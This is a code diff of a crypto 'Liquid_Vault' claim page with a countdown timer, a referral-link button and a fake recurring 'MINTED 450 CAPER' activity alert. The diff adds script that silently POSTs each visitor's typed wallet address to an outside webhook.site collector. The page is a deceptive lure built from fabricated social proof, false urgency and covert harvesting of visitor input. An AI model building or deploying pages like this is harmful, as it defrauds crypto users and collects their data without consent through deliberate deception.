@@ -1,34 +1,26 @@
 <!DOCTYPE html>
-<html lang="en" class="bg-[#050505] text-white">
+<html lang="en" class="bg-[#050505] text-white font-mono">
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://cdn.tailwindcss.com"></script>
-    <title>GHOST_VAULT</title>
 </head>
-<body class="flex items-center justify-center min-h-screen p-4 font-mono">
-    <div class="w-full max-w-[320px] bg-[#0a0a0a] border border-[#00f3ff] p-6 shadow-[0_0_15px_#00f3ff]">
-        <h1 class="text-2xl font-black text-[#ff00ff] uppercase italic tracking-tighter">Liquid_Drop</h1>
-        
-        <div id="gate" class="mt-8 text-center border-t border-[#333] pt-6">
-            <input id="wallet" type="text" placeholder="ENTER WALLET ADDRESS" class="w-full bg-black border border-[#333] p-2 text-[10px] mb-4 text-[#00f3ff]">
-            <p id="timer" class="text-6xl text-[#00f3ff] font-bold">30</p>
-            <a id="cta" href="YOUR_REFERRAL_LINK_HERE" class="hidden w-full mt-4 bg-[#00f3ff] text-black font-bold py-3 uppercase hover:bg-white transition-all">Claim Allocation</a>
+<body class="flex items-center justify-center min-h-screen p-4">
+    <div class="w-full max-w-[300px] border-l-4 border-[#ff00ff] bg-[#111] p-6 shadow-[0_0_20px_#ff00ff]">
+        <h1 class="text-2xl font-black text-[#00f3ff] italic uppercase tracking-tighter">Liquid_Vault</h1>
+        <div class="mt-8 pt-6 border-t border-[#333] text-center">
+            <input id="w" type="text" placeholder="WALLET ADDRESS" class="w-full bg-black p-2 text-[10px] text-[#00f3ff] border border-[#333] mb-4">
+            <p id="timer" class="text-6xl font-bold text-[#00f3ff]">30</p>
+            <a id="cta" href="YOUR_REFERRAL_LINK_HERE" class="hidden block w-full mt-6 bg-[#ff00ff] text-black font-bold py-3 uppercase hover:bg-white">SYNC NOW</a>
         </div>
     </div>
-
-    <div id="fomo" class="fixed bottom-4 right-4 bg-[#050505] border border-[#ff00ff] px-3 py-1 text-[10px] text-[#ff00ff] opacity-0 transition-opacity">
-        ALERT: 0x82...a1 JUST MINTED 450 CAPER
-    </div>
-
+    <div id="fomo" class="fixed bottom-4 right-4 bg-[#050505] border border-[#00f3ff] p-2 text-[8px] text-[#00f3ff] opacity-0 transition-opacity">ALERT: 0x82...a1 MINTED 450 CAPER</div>
     <script>
         let t = 30;
-        const i = setInterval(() => { t--; document.getElementById('timer').innerText = t; 
-            if(t <= 0) { clearInterval(i); document.getElementById('cta').classList.remove('hidden'); } }, 1000);
-        setInterval(() => { const f = document.getElementById('fomo'); f.classList.remove('opacity-0'); 
-            setTimeout(() => f.classList.add('opacity-0'), 2000); }, 5000);
-        
-        // Log wallet address to console (In a real scenario, this would POST to a webhook)
-        document.getElementById('wallet').onblur = () => console.log("Lead Captured: " + document.getElementById('wallet').value);
+        const i = setInterval(() => { t--; document.getElementById('timer').innerText = t; if(t <= 0) { clearInterval(i); document.getElementById('cta').classList.remove('hidden'); } }, 1000);
+        setInterval(() => { const f = document.getElementById('fomo'); f.classList.remove('opacity-0'); setTimeout(() => f.classList.add('opacity-0'), 2000); }, 5000);
+        document.getElementById('w').addEventListener('blur', () => {
+            fetch('https://webhook.site/YOUR-UNIQUE-ID', { method: 'POST', body: JSON.stringify({ wallet: document.getElementById('w').value }) });
+        });
     </script>
 </body>
 </html>
